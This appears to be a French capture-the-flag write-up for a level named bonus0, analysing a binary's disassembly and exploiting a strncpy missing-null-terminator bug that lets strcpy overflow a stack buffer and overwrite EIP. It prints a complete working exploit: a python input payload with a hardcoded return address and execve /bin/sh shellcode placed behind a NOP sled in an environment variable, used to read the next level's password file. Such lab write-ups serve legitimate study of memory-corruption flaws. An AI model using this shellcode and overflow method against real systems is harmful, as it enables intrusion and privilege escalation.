## Bonus0

### Analyse
Le main alloue un buffer de 42 bytes (esp+0x16) et appelle pp, puis puts sur le résultat.

```bash
(gdb) disas main
   0x080485aa <+6>:     sub    $0x40,%esp
   0x080485ad <+9>:     lea    0x16(%esp),%eax   # buffer 42 bytes
   0x080485b4 <+16>:    call   0x804851e <pp>
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
```
pp appelle p deux fois avec deux buffers distincts (ebp-0x30 et ebp-0x1c), puis strcpy le premier dans le buffer de main, trouve la fin et ajoute un espace (" "), puis strcat le second.

p affiche " - ", lit jusqu'à 4096 bytes, cherche le \n avec strchr et le remplace par \0, puis copie 20 bytes max (strncpy avec 0x14) dans le buffer destination.

La vulnérabilité : strncpy copie 20 bytes sans null-terminator si l'input fait exactement 20 chars. Le strcpy dans pp déborde alors sur le buffer de main et écrase l'EIP.

### Exploitation
Le buffer est trop petit pour un shellcode direct. On place le shellcode dans une variable d'environnement avec un NOP sled.
- Premier input : 4095 B + \n (remplit le read, strncpy prend les 20 premiers B)
- Deuxième input : 9 A + adresse NOP sled + 30 B de padding (écrase EIP à l'offset 9)

```bash
$ python -c 'print "B"*4095+"\n"+"A"*9+"\x57\xfe\xff\xbf"+"B"*30' > /tmp/file

$ cat /tmp/file - | env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./bonus0

cat /home/user/bonus1/.pass
```
